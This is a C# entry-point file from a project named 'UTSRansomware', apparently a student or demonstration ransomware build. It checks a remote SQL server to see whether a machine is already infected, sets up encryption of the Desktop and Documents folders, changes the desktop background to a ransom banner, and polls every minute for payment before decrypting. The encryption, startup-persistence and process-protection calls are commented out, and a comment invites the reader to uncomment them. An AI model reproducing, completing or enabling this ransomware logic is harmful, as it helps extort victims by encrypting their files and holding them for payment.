namespace UTSRansomware
{
    internal class Program
    {
        // Entry point of program
        static void Main(string[] args)
        {

            // Will mark the process as critical causing BSOD if terminated
            //Utils.MakeProcessUnkillable();

            // Add program to startup registry for launch on login
            // Utils.AddToStartup();


            // Querys SQL server to see if computer has already been encrypted
            // If it hasn't then encrypt it
            if (!SQLManager.ComputerInfected())
            {
                /* 
                 * Creates new encryptor class and and encrypt "special" directories e.g Desktop, Documents, etc
                 * Line below is commented out so running it doesn't encrypt your computer
                 * Uncomment it to see it function
                 */
                Encryptor encryptor = new Encryptor();


                // encryptor.EncryptSpecialDirectories();

                // Sets desktop background to red banner after encryption completes
                Utils.SetDesktopBackground();

            }

            /* 
             * Checks SQL server every minute to see if ransom has been paid
             * Will begin decryption process once ransom paid
             */
            while (true)
            {
                Console.WriteLine("Waiting on ransom payment");
                if (SQLManager.IsRansomPaid())
                {
                    Decryptor decryptor = new Decryptor();
                    decryptor.DecryptSpecialDirectories();
                    Console.ReadKey();
                    Environment.Exit(0);
                }

                // Pauses program for 1 minute
                Thread.Sleep(60000);
            }
        }
    }
}